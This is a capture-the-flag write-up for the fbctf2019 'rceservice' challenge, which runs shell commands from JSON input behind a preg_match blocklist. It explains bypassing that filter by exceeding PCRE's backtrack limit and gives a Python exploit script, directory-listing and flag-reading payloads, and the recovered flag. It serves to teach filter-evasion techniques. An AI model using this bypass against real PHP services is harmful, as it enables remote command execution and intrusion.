# rceservice

This challenge is very short:

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

It uses `preg_match()` to block a lot of patterns.

But we know that PHP has `pcre.backtrack_limit`, and the value of it is `1000000` by default.

When the regex matching backtrack more than `1000000` times, the `preg_match` will return `false` directly.

(Detail: https://www.php.net/manual/en/pcre.configuration.php)

![](https://github.com/w181496/CTF/raw/master/fbctf2019/rceservice/pcre.png)

([regex101](https://regex101.com) is your good friend)

You can test this special feature on your php console:

```
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1000000)));
bool(false)
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1)));
int(1)
```

So if the number of backtracking times exceeds the limit, the `preg_match` will return `false` and then bypass the `if` check.

Exploit script:

```python
import requests

payload = '{"cmd":"ls /","zz":"' + "a"*(1000000) + '"}'

r = requests.post("http://challenges.fbctf.com:8085/", data={"cmd":payload})
print r.text
```


e.g.

`'{"cmd":"ls -al /home/rceservice/","zz":"' + "a"*(1000000) + '"}'`

=>

```
drwxr-xr-x 1 root root       4096 May 26 21:20 ..
-r--r--r-- 1 root rceservice   43 May 23 03:58 flag
dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
```

Bypass successfully!

Now, let's read flag:

`'{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'`

=> `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`


